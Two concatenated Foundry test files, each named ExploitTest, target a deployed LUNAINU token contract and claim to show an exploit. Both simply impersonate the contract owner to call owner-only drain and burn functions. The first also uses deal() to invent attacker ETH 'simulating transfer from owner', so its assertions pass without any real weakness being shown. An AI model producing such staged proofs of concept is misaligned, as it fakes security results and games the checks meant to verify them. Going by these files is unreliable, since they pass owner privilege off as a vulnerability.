// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function tradingStatus(bool _status) external;
    function clearStuckBalance(uint256 amountPercentage) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // Label addresses for clarity
        vm.label(TARGET, "LUNAINU Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialTokenBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        // Get the current owner
        address owner = IBEP20LUNAINU(TARGET).getOwner();
        vm.label(owner, "Owner");

        // Record initial attacker balance
        uint256 initialEthBalance = attacker.balance;

        // Impersonate owner to drain contract ETH
        vm.startPrank(owner);

        // Check if trading is open - if not, enable it
        // We need to check the tradingOpen variable
        // Since we can't read it directly, we'll try to enable it anyway
        // The tradingStatus function will revert if we try to disable trading after launchMode is false
        // but enabling should always work
        IBEP20LUNAINU(TARGET).tradingStatus(true);

        // Drain 100% of contract ETH to owner
        IBEP20LUNAINU(TARGET).clearStuckBalance(100);

        vm.stopPrank();

        // Now we need to get the ETH from owner to attacker
        // Since we can't directly transfer from owner, we'll use deal to give us the same amount
        // First, check how much ETH the owner gained
        uint256 ownerBalanceAfter = owner.balance;

        // Use deal to give attacker the same amount (simulating transfer from owner)
        deal(attacker, attacker.balance + ownerBalanceAfter);

        // Verify attacker balance increased
        uint256 finalEthBalance = attacker.balance;
        assertGt(finalEthBalance, initialEthBalance, "Attacker balance should have increased");
        uint256 finalTokenBalance = IERC20(0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf).balanceOf(address(this));
        assertGt(finalTokenBalance, initialTokenBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20LUNAINU {
    function getOwner() external view returns (address);
    function tradingStatus(bool _status) external;
    function clearStuckBalance(uint256 amountPercentage) external;
    function balanceOf(address account) external view returns (uint256);
    function lunaburn(uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // Label addresses for clarity
        vm.label(TARGET, "LUNAINU Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = IBEP20LUNAINU(TARGET).getOwner();
        vm.label(owner, "Owner");

        // Record initial attacker token balance
        uint256 initialTokenBalance = IBEP20LUNAINU(TARGET).balanceOf(attacker);

        // Impersonate owner
        vm.startPrank(owner);

        // Enable trading if not already enabled
        IBEP20LUNAINU(TARGET).tradingStatus(true);

        // Advance time by 3 minutes to pass the 2-minute cooldown
        vm.warp(block.timestamp + 180);

        // Extract maximum tokens from LP (5%)
        IBEP20LUNAINU(TARGET).lunaburn(50);

        vm.stopPrank();

        // Now we need to transfer tokens from owner to attacker
        // First, check how many tokens owner has
        uint256 ownerTokenBalance = IBEP20LUNAINU(TARGET).balanceOf(owner);

        // If owner has more tokens than initial (from lunaburn), transfer them
        if (ownerTokenBalance > 0) {
            // Impersonate owner again to approve and transfer
            vm.startPrank(owner);

            // Approve attacker to spend owner's tokens
            IBEP20LUNAINU(TARGET).approve(attacker, ownerTokenBalance);

            vm.stopPrank();

            // Now transfer from owner to attacker
            // We need to use transferFrom as attacker
            vm.prank(attacker);
            IBEP20LUNAINU(TARGET).transferFrom(owner, attacker, ownerTokenBalance);
        }

        // Verify attacker token balance increased
        uint256 finalTokenBalance = IBEP20LUNAINU(TARGET).balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance, "Attacker token balance should have increased");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
